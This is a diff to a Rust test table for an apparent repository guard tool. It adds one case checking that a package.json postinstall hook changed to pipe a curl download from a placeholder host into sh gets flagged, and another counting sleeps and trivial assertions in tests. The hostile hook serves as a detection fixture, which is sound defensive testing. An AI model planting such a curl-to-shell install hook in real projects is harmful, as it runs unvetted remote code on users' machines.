@@ -338,6 +338,34 @@ const CASES: &[Case] = &[
         },
     ),
     (
+        "build-hooks: a lifecycle script gaining curl is reported, an unchanged one is not",
+        || {
+            use crate::gitctx::{ChangeKind, ChangedFile};
+            use crate::guards::build_hooks::judge;
+            let f = ChangedFile {
+                path: "package.json".into(),
+                old_path: "package.json".into(),
+                kind: ChangeKind::Modified,
+                added_lines: Default::default(),
+            };
+            let base = r#"{"scripts": {"postinstall": "node patch.js"}}"#;
+            let head = r#"{"scripts": {"postinstall": "curl https://x.example/s | sh"}}"#;
+            Ok(judge(&f, Some(base), Some(base)).is_empty() && judge(&f, Some(base), Some(head)).len() == 1)
+        },
+    ),
+    (
+        "calls: a sleep and an is_ok() assertion are counted, an equality is not",
+        || {
+            let v = AssertVocabulary::default();
+            let waits = analyze("#[test]\nfn t() { std::thread::sleep(d()); assert!(run().is_ok()); }", &v)?;
+            let plain = analyze("#[test]\nfn t() { assert_eq!(run().unwrap(), 1); }", &v)?;
+            Ok(waits.tests[0].sleeps == 1
+                && waits.tests[0].trivial_asserts == 1
+                && plain.tests[0].sleeps == 0
+                && plain.tests[0].trivial_asserts == 0)
+        },
+    ),
+    (
         "ci-integrity: advisory is read from the flag, not from a comment",
         || {
             use crate::guards::ci_integrity::run_is_advisory;
